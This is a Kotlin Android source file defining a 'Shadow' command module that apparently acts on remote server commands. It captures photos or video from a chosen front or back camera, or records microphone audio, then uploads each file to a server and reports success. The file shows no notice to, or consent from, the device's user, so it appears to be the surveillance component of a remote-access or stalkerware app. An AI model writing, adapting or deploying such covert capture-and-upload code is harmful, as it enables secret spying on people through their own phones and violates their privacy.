package com.hc.calling.commands.shadow

import android.content.Context
import android.os.Build
import com.google.gson.Gson
import com.hc.calling.commands.Command
import com.hc.calling.commands.Executor
import com.hc.calling.commands.shadow.data.ShadowDTO
import com.hc.calling.commands.shadow.data.ShadowVM
import com.hc.calling.commands.shadow.mic.util.RecoderHelper
import com.hc.calling.commands.shadow.vision.camera.Camera1Control
import com.hc.calling.commands.shadow.vision.camera.Camera2Control
import com.hc.calling.util.DateUtil
import com.orhanobut.logger.Logger
import java.io.File

/**
 * Created by ChanHong on 2019/3/27
 *
 * send pic or video to the server
 */

class Shadow(context: Context) : Command(), Executor {
    private val mContext = context
    private val recorders = mutableListOf(Camera1Control(mContext), Camera2Control(mContext))
    private val cameraVersion = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) 1 else 0

    companion object {
        const val SEND_SHADOW = "send_shadow"
        const val SHADOW = "shadow"

        const val SEND_PIC = "send_pic"
        const val SEND_VIDEO = "send_video"
        const val SEND_VOICE = "send_audio"
    }

    /**
     * @data is the command rule
     * data[0] is  the command type between SEND_PIC     OR     SEND_VIDEO
     * data[1] is the camera type between CAMERA_FRONT = "1"    or    CAMERA_BACK = "0"
     */
    override fun execute(data: Array<Any>) {

        Logger.i(data[0].toString())
        val dto = Gson().fromJson(data[0].toString(), ShadowDTO::class.java)
        val serverCommand = dto.type
        val camera = dto.camera
        var path =
            File(mContext.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss")).path
        if (serverCommand == SEND_VOICE) {
            path = "$path.mp3"
            RecoderHelper(mContext) {
                ShadowVM().upLoadFile(File(path)) {
                    emitData(SHADOW, "voice upload success")

                }
            }.record(path)

        } else {
            shadow(cameraVersion, serverCommand, camera, path)
        }

    }


    /**
     * upload the video when record complete
     */
    private fun shadow(cameraVersion: Int, type: String, camera: String, filePath: String) {
        recorders[cameraVersion].apply {
            this.mCamera = camera
            this.mFilePath = filePath
            this.initMediaRecorder {
                when (type) {
                    SEND_PIC -> {
                        this.takePhoto {
                            uploadFile(it)
                        }
                    }

                    SEND_VIDEO -> {
                        this.record {
                            uploadFile(it)
                        }
                    }
                }
            }

        }

    }

    private fun uploadFile(filePath: String) {
        ShadowVM().upLoadFile(File(filePath)) { data ->
            Logger.i(data)
            emitData(SHADOW, "success")
        }
    }

}